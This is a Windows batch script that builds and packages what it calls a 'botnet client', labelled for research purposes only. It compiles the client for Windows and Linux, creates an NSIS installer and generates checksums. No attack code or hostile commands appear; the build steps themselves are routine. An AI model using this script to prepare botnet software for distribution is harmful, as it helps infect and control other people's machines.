@echo off
REM Cross-platform build script for botnet client (Windows)
REM FOR EDUCATIONAL AND RESEARCH PURPOSES ONLY

setlocal enabledelayedexpansion

set SCRIPT_DIR=%~dp0
set PROJECT_ROOT=%SCRIPT_DIR%..
set BUILD_DIR=%PROJECT_ROOT%\build
set DEPLOY_DIR=%PROJECT_ROOT%\deploy\packages

echo ========================================
echo   Botnet Client Cross-Platform Builder
echo     FOR RESEARCH PURPOSES ONLY
echo ========================================

REM Check if Docker is available
docker --version >nul 2>&1
if errorlevel 1 (
    echo WARNING: Docker not found - local compilation only
    set DOCKER_AVAILABLE=false
) else (
    echo SUCCESS: Docker found - cross-compilation available
    set DOCKER_AVAILABLE=true
)

REM Clean previous builds
echo Cleaning previous builds...
if exist "%BUILD_DIR%" rmdir /s /q "%BUILD_DIR%"
if exist "%DEPLOY_DIR%" rmdir /s /q "%DEPLOY_DIR%"
mkdir "%DEPLOY_DIR%"

REM Build for Windows (native)
echo Building for Windows (native)...
cd /d "%PROJECT_ROOT%"
mkdir "%BUILD_DIR%\windows"
cd /d "%BUILD_DIR%\windows"

REM Use Visual Studio if available, otherwise use MinGW
where cl.exe >nul 2>&1
if not errorlevel 1 (
    echo Using Visual Studio compiler...
    cmake -G "Visual Studio 16 2019" -A x64 -DCMAKE_BUILD_TYPE=Release "%PROJECT_ROOT%"
    cmake --build . --config Release
) else (
    echo Using MinGW compiler...
    cmake -G "MinGW Makefiles" -DCMAKE_BUILD_TYPE=Release "%PROJECT_ROOT%"
    mingw32-make -j4
)

cmake --build . --target package --config Release
copy *.tar.gz "%DEPLOY_DIR%\"

echo SUCCESS: Windows build completed

REM Build for Linux using Docker (if available)
if "%DOCKER_AVAILABLE%"=="true" (
    echo Building for Linux using Docker...
    docker run --rm -v "%PROJECT_ROOT%:/src" -v "%DEPLOY_DIR%:/deploy" -w /src dockcross/linux-x64 bash -c "mkdir -p build/linux && cd build/linux && cmake -DCMAKE_BUILD_TYPE=Release -DCMAKE_TOOLCHAIN_FILE=/usr/xcc/cmake/toolchain.cmake /src && make -j4 && make package && cp *.tar.gz /deploy/"
    
    if not errorlevel 1 (
        echo SUCCESS: Linux build completed
    ) else (
        echo WARNING: Linux build failed
    )
) else (
    echo SKIPPING: Linux build (Docker required)
)

REM Create Windows installer using NSIS (if available)
where makensis.exe >nul 2>&1
if not errorlevel 1 (
    echo Creating Windows installer...
    cd /d "%DEPLOY_DIR%"
    
    REM Extract the Windows package
    for %%f in (botnet-client-windows-*.tar.gz) do (
        tar -xzf "%%f"
    )
    
    REM Create installer
    makensis "%PROJECT_ROOT%\installers\windows\installer.nsi"
    echo SUCCESS: Windows installer created
) else (
    echo SKIPPING: Windows installer creation (NSIS not found)
)

REM Generate checksums
echo Generating checksums...
cd /d "%DEPLOY_DIR%"
for /r %%f in (*.tar.gz *.exe *.msi) do (
    certutil -hashfile "%%f" SHA256 >> checksums.txt
)

echo ========================================
echo   Build process completed successfully!
echo ========================================
echo Packages available in: %DEPLOY_DIR%
dir "%DEPLOY_DIR%"

echo.
echo WARNING: FOR RESEARCH PURPOSES ONLY
echo Use responsibly and ethically!

pause
